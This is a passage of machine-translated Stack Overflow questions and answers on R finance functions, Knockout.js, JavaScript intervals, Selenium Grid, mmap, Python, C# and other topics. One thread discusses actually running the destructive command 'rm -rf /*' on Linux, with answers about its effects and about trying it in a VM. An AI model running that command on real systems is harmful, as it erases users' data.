它可以从不同类型的文本文件中删除换行符，但不处理 html。

* * *

## 回答 #12

> 赞同：0
> 
> 时间：2021-07-07T09:34:40.843

您可以使用 preg_replace 来替换与正则表达式匹配的部分字符串，例如：

```
preg_replace("/\s+/","",$string); 
```

# r - R tvm 财务套餐

> ID：10757673
> 
> 赞同：0
> 
> 时间：2012-05-25T15:56:57.140
> 
> 标签：r, package, financial

我试图使用财务包中的 fvm 来估计支付流的现值。

```
y <- tvm(pv=NA,i=2.5,n=1:10,pmt=-c(5,5,5,5,5,8,8,8,8,8)) 
```

我得到的结果是：

```
y

Time Value of Money model

    I% #N    PV FV PMT Days #Adv P/YR C/YR
1  2.5  1  4.99  0  -5   30    0   12   12
2  2.5  2  9.97  0  -5   30    0   12   12
3  2.5  3 14.94  0  -5   30    0   12   12
4  2.5  4 19.90  0  -5   30    0   12   12
5  2.5  5 24.84  0  -5   30    0   12   12
6  2.5  6 47.65  0  -8   30    0   12   12
7  2.5  7 55.54  0  -8   30    0   12   12
8  2.5  8 63.40  0  -8   30    0   12   12
9  2.5  9 71.26  0  -8   30    0   12   12
10 2.5 10 79.09  0  -8   30    0   12   12 
```

PV 从 5 跳到 6（当价格变为 8 时）似乎不正确。这会影响 y[10,3] 中的结果，这是我有兴趣获得的结果。

当整个流中的付款相同时，Excel 中的 NPV 公式会产生相似的结果，但是，当 paymets 的向量是可变的时，tvm 公式和 NPV 的结果不同。我需要获得与 NPV 公式在 Excel 中提供的相同结果。

我应该怎么做才能完成这项工作？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-26T01:17:53.287

cf 公式有帮助，但它并不总是与 Excel 一致。

我使用以下函数解决了我的问题：

```
npv<-function(a,b,c) sum(a/(1+b)^c) 
```

# knockout.js - KnockoutJs：从模型实例中获取绑定元素

> ID：10757674
> 
> 赞同：21
> 
> 时间：2012-05-25T15:56:58.403
> 
> 标签：knockout.js

是否有可能获得数据（模型）实例绑定到的相应元素（或多个元素）？

例如，我在 ViewModel 属性中存储了一组“Person”对象。

我将 ViewModel 绑定到呈现它的视图，例如：

```
<div class="people" data-bind="template: { foreach: people }">
    <a href="#" class="person" data-bind="text: name"></a>
</div> 
```

然后我通过 jQuery 绑定一些事件处理程序：

```
$container.on('click', '.person', function(e){
    e.preventDefault();
    self.showPerson( ko.dataFor(this) );
}); 
```

在我的`showPerson`方法中，我会保存对模型的引用。我/可以/还保存对元素的引用，但如果我不需要，我不想这样做。

```
self.showPerson = function(person) {
    // can i get the corresponding element from the 'person' model?
}; 
```

有人有什么想法吗？

* * *

## 回答 #1

> 赞同：20
> 
> 时间：2014-05-13T17:47:03.167

您可以简单地创建自定义绑定

```
 // data-bind="element: observable"
    // sets observable to element ..
    ko.bindingHandlers.element = {
        init: function(element, valueAccessor) {
            var target = valueAccessor();
            target(element);
        }
    }; 
```

在您的视图模型中，创建一个“字段”来存储元素：

```
person.el = ko.observable(null); 
```

然后在你的html模板中..

```
<div data-bind="element: el"> .... </div> 
```

* * *

## 回答 #2

> 赞同：9
> 
> 时间：2012-05-26T06:04:58.593

您对 $container 和 jquery 的语法和使用以及 '.person' 的第二个参数对我来说是不熟悉的，但是在您的点击处理程序中，不是`this`被点击的元素吗？您不能也将它传递给您的 showPerson 方法吗？

```
$container.on('click', '.person', function(e){
    e.preventDefault();
    self.showPerson( ko.dataFor(this), this );
});

self.showPerson = function(person, element) {
    // can i get the corresponding element from the 'person' model?
}; 
```

我不知道如何获得可观察对象绑定的元素，但它可能是几个不同的元素。例如，您可以为“名称”提供一个文本框，在跨度中显示名称，在计算中使用它，拥有订阅者，并在另一个绑定中的计算中使用 name().length。

也就是说，如果您使用 knout 的调试版本，您可以看到您的 observables 具有`_subscriptions`可能具有您正在寻找的属性的属性。缩小版是我认为的一些单一字符。

* * *

## 回答 #3

> 赞同：5
> 
> 时间：2012-05-25T16:00:50.587

为什么不移动你的点击事件绑定`foreach`？

`<a href="#" class="person" data-bind="text: name, click: showPerson"></a>`

在这种情况下，您的`showPerson()`函数将具有正确的数据`person`

编辑 ：

对不起，但我想我错过了你问题的核心：

```
self.showPerson = function (person, event) {
     element = event.srcElement
     ...
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-12-23T06:33:06.837

```
self.showPerson = function(data, event) {
  // event.currentTarget is the DOM element
  // $(event.currentTarget) gives the jQuery element
} 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2016-01-30T09:58:57.580

我认为最佳实践是直接绑定到视图模型上的函数而不是附加处理程序。

[在 foreach 中单击绑定到父函数](https://stackoverflow.com/questions/13804705/knockout-js-click-binding-to-parent-function-in-foreach)

# c# - 寻找一个 msbuild 和 xbuild 任务来获取引用的库（没有 nuget.exe）

> ID：10757676
> 
> 赞同：3
> 
> 时间：2012-05-25T15:57:04.953
> 
> 标签：c#, nuget, openwrap

我在为我的构建系统创建一个基于单声道的简单解决方案时遇到了问题。

目前的情况是我将引用的库保存在 git 存储库中，这并不好，原因有很多。

我想要实现的是类似于 NuGet 提供的东西 - 自动从 Web 下载 dll，将它们放在某个目录中并忘记它们。

我想在构建时执行此操作，因此下载库等不需要任何额外操作。最好的选择是 msbuild（xbuild on mono）任务，但我希望它独立于系统，所以很受欢迎，执行 NuGet.exe 是不可能的（考虑并行单声道安装等）。

我已经尝试过 Pepita 项目，但它......错了。不，真的，它有太多设计错误，难以使用或修复。要进行正确的配置，需要对整个项目进行认真的重写。

我想要**的**是一个库，它将使用 NuGet.Core 库并作为一项任务提供。如果没有这样的库，我可以使用任何解决方案，下载一个 nuget 包并将其解压缩到 .csproj 中指定的目录。

更好的是，如果这样的库可以解决依赖关系而不在 packages.config （或类似）文件中明确指定它们，那就太好了，例如，如果我想包含 Castle.Windsor 我不想在我的配置中包含 Castle.Core文件。

我知道 OpenWrap 项目（带有 NuGet Gallery），它看起来很有希望，但我找不到解决方案，我只需在我的仓库中放置一组**常量**库，修改 csproj 文件，一些配置并完成它。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-26T07:54:08.300

我可以告诉你，核心的 OpenWrap 具有内置的一切，可以做你想做的事。您可以使用 openwrap-shell 执行的所有操作也可以从 msbuild 中调用。因此，在我看来，您只需要添加一个 before build 钩子来调用 openwrap 来执行“update-wrap”。几个月前，我实际上考虑过做类似的事情。AFAIR 我实际上编写了一个 msbuild 脚本来调用 openwrap 任务，但并没有真正将它们挂钩到正常的构建过程中。

我不知道你所说的“在你的仓库中放置一组常量库一次”是什么意思？对于 OpenWrap，您需要做的就是为您的项目维护“openwrap 描述符”。该文件包含项目的所有直接依赖项（对版本号有或没有限制）。（间接依赖会自动引入）你想知道当你有一堆二进制 dll 开始时你是如何开始的吗？我可以告诉你我做了什么。基本上，我不使用任何 NuGet 包，我为所有内容创建了 OpenWrap 包。我还为我们所有的二进制依赖项（其中一些是开源的）创建了 OpenWrap 包。这真的超级简单：在 OpenWrap 描述符中填写正确的依赖项，并指定包必须只包含给定的 dll。

如果您想查看示例，可以查看以下示例： [http ://code.google.com/p/ppwcode/source/browse/dotnet/External/Apache.Log4Net/trunk/Apache.Log4Net.wrapdesc](http://code.google.com/p/ppwcode/source/browse/dotnet/External/Apache.Log4Net/trunk/Apache.Log4Net.wrapdesc)

这就是打包二进制依赖项所要做的一切。这是我创建的一个包，我们目前在我工作的公司中使用它。我知道 Log4Net 可能作为 NuGet 包提供，我可能会使用它。自己创建这些二进制包的好处是，我可以完全控制包、包的版本号、如何将一个大项目拆分为几个较小的包等等。

作为 OpenWrap 存储库，您可以使用本地文件系统上的文件夹或网络共享上的文件夹。我们使用的实际上是一个 webdav 存储库，我们在本地安装在驱动器上（使用 Windows 7）。这对我们来说很好，还允许我们指定谁对存储库具有读写访问权限。

您提到单声道....好吧，这可能是一个问题：当前发布的 OpenWrap (2.0.2) 版本不能在单声道 AFAIK 上运行。但好消息是，Sebastien Lambla 一直在努力让 OpenWrap 在 mono+xbuild 上运行，新版本即将发布：2.0.3。目前还没有可用的 alpha/beta 版本，但您可以从 git 构建。（在这种情况下，您需要同时构建 openwrap-shell 和 openwrap）。创建 OpenWrap 的 Sebastien Lambla 通常会密切关注 StackOverflow 上的问题，并且可能能够为您提供有关单声道状态的更完整答案。

顺便说一句，在我工作的地方，我们已经使用 OpenWrap 一年多了。那时我们比较了 NuGet 和 OpenWrap，那时 OpenWrap 远远领先于 NuGet。基本上，对我来说，NuGet 不是依赖管理工具，而是帮助您在 Visual Studio 中从远程服务器中提取二进制依赖项的工具（意思是：将 dll 从远程服务器复制到本地文件夹并添加对本地 dll 的引用项目文件）。与此同时，NuGet 一直在追赶 OpenWrap，并添加了 OpenWrap 中已经存在的功能。在我看来，NuGet 在 OpenWrap 上只有两件事，那就是集成到 Visual Studio 中（也就是远程可用包的概述和单击单击单击添加包）以及它由 Microsoft 人员维护的事实（AFAIK） . 这两件事都只是政治性的：它' 通过漂亮的界面和微软支持更容易说服人们。然而，就我个人而言，我认为 OpenWrap 在技术上更胜一筹，我认为它没有得到应有的关注真的很遗憾。

# javascript - 如何将所选日期从弹出窗口显示到所选ID

> ID：10757677
> 
> 赞同：1
> 
> 时间：2012-05-25T15:57:05.903
> 
> 标签：javascript, jquery

在我的项目中，我有一个要求，例如日期应该与上一个和下一个链接一起显示，并且与下一个链接相邻的是弹出 jquery 日历来选择特定日期。这我已经实现如下

```
<script>
    function ShowSchedule() {
        document.getElementById("today").innerHTML = date;
    }

    function ShowDay(isNextDay) {
        if (isNextDay) {
            currentTime = new Date(currentTime.getFullYear(), month, currentTime.getDate() + 1);
            date = month_name[currentTime.getMonth()] + " " + currentTime.getDate() + ", " + currentTime.getFullYear();
            ShowSchedule();
        }
        else {
            currentTime = new Date(currentTime.getFullYear(), month, currentTime.getDate() - 1);
            date = month_name[currentTime.getMonth()] + " " + currentTime.getDate() + ", " + currentTime.getFullYear();
            ShowSchedule();
        }
    }

    $(function() {
        $('#tday').datepick({
            changeMonth: false,
            dateFormat: 'M dd, yyyy',
            showTrigger: '#calImg'
        });
    });
</script>

<body>
    <form>
        <div>
            <a id="prev" href="#" onClick="ShowDay(false)">Prev</a>
            <span id="today">
            </span>
            <a id="next" href="#" onClick="ShowDay(true)">Next</a>
            <input id="tday" />
        </div>
        <script>
            ShowSchedule();
        </script>
    </form>
</body> 
```

通过使用上面的代码，我能够显示当前系统日期以及上一个和下一个链接以及日历弹出窗口。但问题是从弹出日历中选择日期后，我需要显示所选日期当前日期位置。即例如今天日期是 2012 年 5 月 25 日，如果用户选择日期为 2012 年 5 月 20 日，则所选日期应显示在 2012 年 5 月 25 日的位置以及上一个和下一个链接

任何帮助，将不胜感激

# grid - 无法使用 selenium Grid 在虚拟机上注册节点

> ID：10757681
> 
> 赞同：1
> 
> 时间：2012-05-25T15:57:43.517
> 
> 标签：grid, selenium-grid

我是 Selenium Grid 的新手，因此非常感谢这方面的任何帮助。

我正在使用以下版本的硒服务器：

```
selenium-server-standalone-2.20.0.jar 
```

我已经成功地通过在 cmd 行中输入来初始化集线器：

`java -jar selenium-server-standalone-2.20.0.jar -role hub`

我还设法通过执行以下命令行在我的物理机上注册了一个节点：

*java -jar selenium-server-standalone-2.20.0.jar -role webdriver -hub `http://localhost:4444`/grid/register -browser browserName=iexplore,platform=WINDOWS -port 5556*

我已经通过转到`http://localhost:4444`/grid/console 验证了上述内容，可以看到该节点已成功注册到端口 5556。

现在作为下一步，我正在尝试通过在 cmd 行中运行以下命令在 Windows7 虚拟机（IP 地址=10.0.0.79）上注册另一个节点：

*java -jar selenium-server-standalone-2.20.0.jar -role webdriver -hub `http://10.0.0.79:4444`/grid/register -browser browserName=iexplore,platform=WINDOWS*

不幸的是，上面的 cmd 没有注册我的请求，我收到错误：无法注册此节点：集线器关闭或没有响应

如果有人能告诉我我做错了什么，我将不胜感激。

干杯

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-28T08:14:52.007

10.0.0.79 是你节点的IP，不是Hub 对吧？集线器在 VM 外部运行（使用不同的 IP）

在您的最后一个命令中，您让它指向 10.0.0.79 上的集线器

# html - 单击停止按钮后 clearInterval() 不起作用

> ID：10757687
> 
> 赞同：1
> 
> 时间：2012-05-25T15:57:55.767
> 
> 标签：html, jquery

我正在尝试使用 java 脚本刷新 div。setInterval（）和clearInterval（），它工作正常，但是当我点击停止按钮时我想停止单个div的刷新过程..clear Interval not working here

```
<script type ="text/javascript">
        $(document).ready(function () {
            $('.output').click(function () {
                var id = $(this).closest('.g').attr('id');

                Go(id);

            })
            $('.bt').click(function () {
           var id = $(this).closest('.g').attr('id');
                stop(id)
            });

            function Go(id) {
                id = setInterval(function () {
                    Chat_msg('Ch04', id, u)
                }, 3000);
            };
            function stop(id) {

                clearInterval(id);

            }

        })

    </script>
</head>

<body>
<div id="a" class='g'>
    <div class="output"></div>
    <input id="Button1" type="button" value="stop" class="bt" />
</div>

<div id="b">
    <div class="output"></div>
    <input id="Button2" type="button" value="stop"  class="bt"/>
</div>

<div id="c">
     <div class="output"></div>
    <input id="Button3" type="button" value="stop" class="bt" />
</div>

</body>
</html> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T16:03:55.903

使用全局变量作为间隔。

```
var interv = null;

interv = setInterval(function { ... }, 5000);

$('#btn').on('click', function(){
    if (interv) clearInterval(intev);
}) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-25T16:12:12.700

我过去解决这个问题的方法是使用一个使用设置超时来调用自身的函数。

```
var stop = false
function caller  () {
  if (stop === true){
    //do something
    setTimeout(caller() , 1000);
  }
  else{
    //do something after button has  been click and stop is set to true
  }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T19:04:33.193

看起来像是范围问题的组合，并且可以互换使用`id`DOM 属性和`setInterval`响应值。

```
<script type ="text/javascript">
    $(document).ready(function () {
        var timeouts = {};

        $('.output').click(function () {
            var id = $(this).closest('.g').attr('id');
            go(id);
        });

        $('.bt').click(function () {
            var id = $(this).closest('.g').attr('id');
            stop(id);
        });

        function go(id) {
            timeouts[id] = setInterval(function () {
                Chat_msg('Ch04', id, u)
            }, 3000);
        }

        function stop(id) {
            clearInterval(timeouts[id]);
        }
    });
</script> 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-25T16:04:16.997

您关联的引用可能`setInterval`不在您的停止按钮处理程序的范围内。

```
$("#start").on("click", function(){
  var interv = setInterval(function(){ /*...*/ }, 1000);
});

$("#stop").on("click", function(){
  clearInterval(interv);
}); 
```

在上面的代码中，我们的`interv`变量不在我们的#stop 按钮处理程序的范围内。我们可以通过将其提升到另一个级别来改变它：

```
var interv;

$("#start").on("click", function(){
  interv = setInterval(function(){ /*...*/ }, 1000);
});

$("#stop").on("click", function(){
  clearInterval(interv);
}); 
```

现在两个处理程序都可以访问该`interv`变量。

# c - libc.so mmap strace

> ID：10757688
> 
> 赞同：0
> 
> 时间：2012-05-25T15:57:58.963
> 
> 标签：c, mmap, libc

我明天正在准备考试，我遇到了这个问题：

在我们使用 strace 运行可执行文件后，关于标准 C lib 的系统调用结果如下：

*   打开（“/lib/libc.so.6”，“O_RDONLY”）= 3
*   mmap(NULL, 36803630, PROT_READ | PROT_EXEC, MAP_PRIVATE | MAP_DENYWRITE, 3, 0) = 0x7f312ab35000
*   mmap(0x7f312aeae000, 20480, PROT_READ | PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 3, 0x179000) = 0x7f312aeae000

问题是为什么 mmap 的第一个系统调用使用 PROT_READ|PROT_EXEC 而第二个系统调用使用 PROT_READ|PROT_WRITE。

请详细解释每次 mmap 调用后会发生什么。我不明白为什么一个进程需要修改 libc（写访问）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T16:01:29.383

地图是私有的（`MAP_PRIVATE`），所以没有任何修改`libc.so`；相反，它正在修改从`libc.so`. 这将包括数据段（libc 中的全局变量）以及全局偏移表（GOT）以及可能在运行时将库重定位到特定地址所涉及的其他结构。

# python - 使用 strip() 清理字符串

> ID：10757689
> 
> 赞同：3
> 
> 时间：2012-05-25T15:57:59.897
> 
> 标签：python, regex, string, python-3.x

我是 python 新手，我有一个看起来像这样的字符串

`Temp = "', '/1412311.2121\n`"

我想要的输出只是得到数字和小数本身..所以我在寻找

```
1412311.2121 
```

作为输出.. 试图摆脱字符串中的 ', '/\n .. 我试过 Temp.strip("\n") 和 Temp.rstrip("\n") 试图删除 \n但我似乎仍然留在我的弦上。:/... 有人有什么想法吗？谢谢你的帮助。

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-05-25T16:05:23.277

字符串是不可变的。`string.strip()`不会改变`string`，它是一个返回值的函数。你需要做：

```
Temp = Temp.strip() 
```

另请注意，`strip()`不带任何参数的调用会导致它删除所有空白字符，包括`\n`

正如 stalk 所说，您可以通过调用`strip("',/\n")`.`Temp`

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-05-25T16:11:10.097

如果数据像你显示的那样，用非数字数据从右到左包装的数字，你可以使用一个非常简单的正则表达式：

```
g = re.search('[0-9.]+', s)  # capture the inner number only
print g.group(0) 
```

* * *

## 回答 #3

> 赞同：4
> 
> 时间：2012-05-25T16:03:29.990

我会使用正则表达式来做到这一点：

```
In [8]: s = "', '/1412311.2121\n"

In [9]: re.findall(r'([+-]?\d+(?:\.\d+)?(?:[eE][+-]\d+)?)', s)
Out[9]: ['1412311.2121'] 
```

这将返回在字符串中找到的所有浮点数的列表。

# c# - 无法数据绑定组合框

> ID：10757693
> 
> 赞同：-1
> 
> 时间：2012-05-25T15:58:05.673
> 
> 标签：c#, .net, winforms

对不起我的新问题，但我有问题：我想添加带有数据绑定的组合框项目，但请参阅 NullException（“对象引用未设置为对象的实例。”），但我在表中有数据。这是我的代码：

```
BesenicaDataSet ds = new BesenicaDataSet();
ds.ReadXml("BesenicaDS.xml");
comboBox1.DataSource = ds.Tables["Kategorii"].DefaultView;
comboBox1.DisplayMember = "Kategoriq"; 
```

更新：

现在，我用这个修复了它并且不能得到异常

```
comboBox1 = new ComboBox(); 
comboBox1.DataSource = ds.Tables["Kategorii"].DefaultView; 
comboBox1.DisplayMember = "Kategoriq"; //second column in table 
comboBox1.ValueMember = "KategoriqID"; //Primary Key column 
```

但现在 ComboBox1.Items.Count == 0 ，但我在这个表中有项目。为什么以及如何解决它？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-05-25T16:02:52.737

很难用你提供的东西来判断。设置断点并查看您的 DataSet 中是否有数据。如果是这样，DisplayMember 拼写是否正确，还是 Table 拼写正确？我注意到它们非常相似，但有一个字母。检查该表是否存在（将其设置为 Watch 或 Hover over it）。更多信息会有所帮助。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-05-29T10:32:30.897

您似乎缺少以下行：

```
comboBox1.DataBind(); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-05-25T16:03:13.067

我敢打赌，无论出于何种原因，DataSet 中都没有名为“Kategorii”的表，当您尝试访问`DefaultView`. 检查您的 xml，并在调试条件下检查 DataSet 中实际存在哪些表。

如果您向我们提供此异常的堆栈跟踪信息以及可能的 xml 文件样本，将会很有帮助。

另一种猜测是它`comboBox1`本身是空的？

**加分**
我只是想检查您是否故意不在`ValueMember`组合框上进行设置，或者只是在此示例代码中省略了它。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-25T16:03:19.100

从给出的小代码中，假设文件 xml 存在并且有效，那么唯一可能的原因是

```
comboBox1.DataSource = ds.Tables["Kategorii"].DefaultView; 
```

这意味着您的数据集中没有名为“Kategorii”的表

试试这个

```
DataTable dt = ds.Tables["Kategorii"];
if(dt == null)
    throw new Exception("There is no datatable Kategorii");
else
    comboBox1.DataSource = dt; 
```

# linux - 有人真的在 Linux 中尝试过 'rm -rf /*' 吗？

> ID：10757694
> 
> 赞同：0
> 
> 时间：2012-05-25T15:58:06.357
> 
> 标签：linux, rm

有人`rm -rf /*`在 Linux 中实际尝试过或类似的东西吗？您总是听到人们对此开玩笑，但我很好奇它是否真的执行了，如果是这样，它实际上会造成什么样的损害（不是删除磁盘）。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T16:03:07.183

只为你，我试过了。我得到了一大堆“rm：无法删除......”，即使使用 sudo。如果您想尝试一下，我推荐 VirtualBox 和 Ubuntu 的副本。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-05-25T16:02:41.180

是的，我做到了，但仅限于可以还原的虚拟机中，只是为了测试和演示（我曾经教过操作系统）。

在较旧的发行版中，它将执行并清除您的发行版，但在大多数较新的发行版中，这将失败。

如果您想尝试，请在您不关心的地方进行，或者在您可以像我一样还原的 VM 中进行。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-05-25T16:02:49.713

我“试过”了吗？不，我做到了吗？是的，而且很糟糕。但是，如果你幸运的话：

*   您没有以 root 身份登录，因此损失很小
*   你已经安装了[safe-rm](http://www.safe-rm.org.nz/)，它可以防止这样的事情发生。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-25T16:03:42.780

Wikipedia：rm -rf（不同地，rm -rf /、rm -rf * 等）经常用于关于 Unix 灾难的笑话和轶事[2]。该命令的 rm -rf 变体，如果由超级用户在根目录上运行，将导致计算机上几乎每个可写挂载文件系统的内容都被删除，直到系统本身因丢失某些关键文件而崩溃，目录之类的。

[http://en.wikipedia.org/wiki/Rm_(Unix)](https://en.wikipedia.org/wiki/Rm_(Unix))

我认为一些发行版增加了保护。

编辑： muffinista 提供了保护的链接。

# regex - Perl 单行，需要在正则表达式之间切线

> ID：10757695
> 
> 赞同：1
> 
> 时间：2012-05-25T15:58:06.343
> 
> 标签：regex, perl

我有几千个日志文件，其中包含标记某些重要事件的日期时间戳。不幸的是，在任何给定的日期时间戳记录的信息有时会插入换行符，因此信息会分布在多行中。此外，还有其他与我的目的无关且没有日期时间戳的信息。

我有一个 perl one-liner 可以提取我想要的信息：

```
perl -ne 'print if /^\d\d:\d\d:\d\d\.\d\d\d/..!/^\d\d:\d\d:\d\d\.\d\d\d/' 
```

但是，我想删除初始行（包含日期时间戳）和以下每一行之后的新行字符。但是，我确实希望在以日期时间戳开头的下一行之前的最后一行之后保留换行符。

我对如何修改我的单线来实现这一点没有任何运气。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T16:12:28.920

```
perl -ne 'if ($inside = /^\d\d:\d\d:\d\d\.\d\d\d/..!/^\d\d:\d\d:\d\d\.\d\d\d/) {
            chomp unless $inside =~ /E0$/;
            print; }' 
```

# php - IIS 上的 CodeIgniter / Gmail SMTP 超时

> ID：10757701
> 
> 赞同：0
> 
> 时间：2012-05-25T15:58:23.470
> 
> 标签：php, codeigniter, iis, smtp, gmail

我正在尝试使用 codeigniter 发送一封简单的电子邮件：

```
 $email_config = Array(
    'protocol' => 'smtp',
    'smtp_host' => 'ssl://smtp.googlemail.com',
    'smtp_port' => 465,
    'smtp_user' => 'xxx',
    'smtp_pass' => 'xxx'
    );
    $this->load->library('email', $email_config);
    $this->email->from('no-reply@mysite.com', 'Admin');
    $this->email->to($email_address); 
    $this->email->subject('Test Subject');
    $this->email->message('Test Message');  
    $this->email->send(); 
```

但它只是超时。我在 php.ini 中有未注释的 extension=php_openssl.dll，但我猜还有其他一些设置问题。我在 IIS7 上运行。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-05-25T16:17:26.847

您是否尝试过检查服务器的传出 Internet 连接以确保一切正常？另外，我也会检查防火墙设置。

对我来说，这看起来不像是 CI 或 PHP 问题，我通过 gmail 发送的配置看起来就像那样，所以你们都很好。

# python - Python 2.7：类型对象“ElementTree”没有属性“register_namespace”

> ID：10757702
> 
> 赞同：12
> 
> 时间：2012-05-25T15:58:23.597
> 
> 标签：python, xml, elementtree

使用此 python 2.7.3（或 2.7.0）代码，我想更改属性“android:versionCode='2'”的值，该属性具有命名空间前缀“android”：

```
#!/usr/bin/python
from xml.etree.ElementTree import ElementTree, dump
import sys, os

# Problem here:
ElementTree.register_namespace("android", "http://schemas.android.com/apk/res/android")

tree = ElementTree()
tree.parse("AndroidManifest.xml")
root = tree.getroot()
root.attrib["{http://schemas.android.com/apk/res/android}versionCode"] = "3"

dump(tree) 
```

[当不使用注释为“Problem here”的代码行时，ElementTree 会将http://schemas.android.com/apk/res/android](http://schemas.android.com/apk/res/android)的命名空间别名自动命名为“ns0”（导致“ns0:versionCode= '3'”。

因此，我使用 ElementTree.register_namespace 将命名空间 url 映射到别名“android”，这[在此处](http://docs.python.org/library/xml.etree.elementtree.html#xml.etree.ElementTree.register_namespace)记录。

我尝试这样做时得到的错误是：

```
AttributeError: type object 'ElementTree' has no attribute 'register_namespace' 
```

有人知道为什么这不起作用吗？这个方法应该在 python 2.7 中可用。

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-05-25T16:10:57.070

[`register_namespace()`是 ElementTree*模块*](http://hg.python.org/cpython/file/2.7/Lib/xml/etree/ElementTree.py#l1030)中包含的一个函数。
它*不*包含在`ElementTree`类中...

顺便说一句：由于这样做有时会引起混淆，因此通常不建议对模块和类使用相同的名称。但是我们现在不打算通过重命名一个广泛使用的模块来破坏生产代码，是吗？

您只需要更改代码：

```
#!/usr/bin/python
import xml.etree.ElementTree as ET # import entire module; use alias for clarity
import sys, os

# note that this is the *module*'s `register_namespace()` function
ET.register_namespace("android", "http://schemas.android.com/apk/res/android")

tree = ET.ElementTree() # instantiate an object of *class* `ElementTree`
tree.parse("AndroidManifest.xml")
root = tree.getroot()
root.attrib["{http://schemas.android.com/apk/res/android}versionCode"] = "3"

ET.dump(tree) # we use the *module*'s `dump()` function 
```

# forms - Chrome/HTML5：输入类型编号不尊重最大属性？

> ID：10757703
> 
> 赞同：25
> 
> 时间：2012-05-25T15:58:25.453
> 
> 标签：forms, html, google-chrome

我有以下标记：

```
<input type="number" max="99" /> 
```

在 Google Chrome（以及可能的其他 webkit 浏览器）中，这将限制微调器的向上箭头超过 99，但它**不会**阻止用户输入高于 99 的数字。即使 onblur，也不会删除/替换无效值或鉴于该值无效，甚至会发出警告。

我是否误解了它应该如何工作，或者这是一个错误？我正在使用最新版本的 Chrome（撰写本文时为 19）。

**编辑：**

为了澄清，我想知道为什么首先允许输入大于指定最大值的数字。我意识到它在表单提交时提供了一个工具提示，告诉你它是无效的，但微调器不允许你超过最大值似乎是不一致的行为，但你可以随时简单地键入一个高于最大值的数字来规避它。

如果出于某种原因这是期望的行为，那是为什么呢？有没有更好的选择来强制输入范围而不诉诸 JS？

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-05-25T16:13:55.353

它确实有效，但如果您将提交按钮和表单放入代码中，您只会看到错误消息（工具提示）：

```
<form action="#" method="get">
  <input type="number" max="99" />
  <input type="submit" value="Submit!" />
</form> 
```

[jsFiddle](http://jsfiddle.net/TAftq/) ​</p>

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2017-10-16T19:06:36.357

这是一个老问题，但我在任何地方都没有找到这个问题的任何相关答案。这种行为仍然存在于 chrome（版本 61）中。

我发现了一个可以在某些情况下使用的小技巧。它与那些使用数据绑定库的人有关`aurelia`。`angular`我只在 aurelia 上测试过——但这也适用于其他人。

`range`诀窍依赖于输入类型强制执行`min`/`max`约束的事实。

我们只需创建另一个输入（类型为`range`），该输入与常规输入绑定到相同的值，然后我们通过隐藏它`css`。

当用户输入大于该`max`值的内容时，它会迅速回到该`max`值。

这是 aurelia 的演示：[https ://gist.run/?id=86fc278d3837718be4691acd5625aaad](https://gist.run/?id=86fc278d3837718be4691acd5625aaad)

# c# - 在盒子/服务器上查找证书位置

> ID：10757715
> 
> 赞同：0
> 
> 时间：2012-05-25T15:59:18.467
> 
> 标签：c#, httpwebrequest

我正在尝试查找证书存储在我的本地计算机上的位置，然后是我们的开发服务器。我可以去运行 -> MMC -> 文件 -> 添加/删除管理单元并选择证书和当前用户，然后查看我的个人证书。但是，我正在尝试将此代码用于 HttpWebRequest，但我找不到 url。

```
string certPath = @"e:\mycertificate.cer"; //This Value
X509Certificate myCert = X509Certificate.CreateFromCertFile(certPath);
request.ClientCertificates.Add(myCert); 
```

在另一个区域，我们设置了一个代理并这样做。

```
proxy.ClientCredentials.ClientCertificate.SetCertificate(StoreLocation.LocalMachine, StoreName.My, X509FindType.FindBySubjectName, CertificateName); 
```

所以显然有一点不同的实现，我不确定在哪里/如何找到第一个例子的位置。

*对我有用的解决方案*

```
public WebRequest GetWebRequest(string address)
{
    HttpWebRequest request = (HttpWebRequest)WebRequest.Create(address);
    X509Certificate myCert = null;
    X509Store store = new X509Store("My");

    store.Open(OpenFlags.ReadOnly);

    foreach (X509Certificate2 mCert in store.Certificates)
    {
        if (mCert.FriendlyName.Contains("certname"))
        {
            myCert = mCert;
        }
    }

    if (myCert != null) { request.ClientCertificates.Add(myCert); }

    return request;
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-05-25T16:06:36.823

假设您想以某种方式选择证书并且并不真正关心它是否来自文件。在这种情况下，您可以使用证书存储对象并找到您需要的对象（即通过指纹）。查看[X509Store.Certificates](http://msdn.microsoft.com/en-us/library/system.security.cryptography.x509certificates.x509store.certificates.aspx)上的 C# 和 MSDN[中的证书存储中的证书列表获取列表，](https://stackoverflow.com/questions/1205295/get-list-of-certificates-from-the-certificate-store-in-c-sharp)其中也包含示例：

```
X509Store store = new X509Store("My");
store.Open(OpenFlags.ReadOnly);

foreach (X509Certificate2 mCert in store.Certificates){
    //TODO's
} 
```

# objective-c - NSFetchedResultsController 未在初始提取时排序

> ID：10757716
> 
> 赞同：1
> 
> 时间：2012-05-25T15:59:19.213
> 
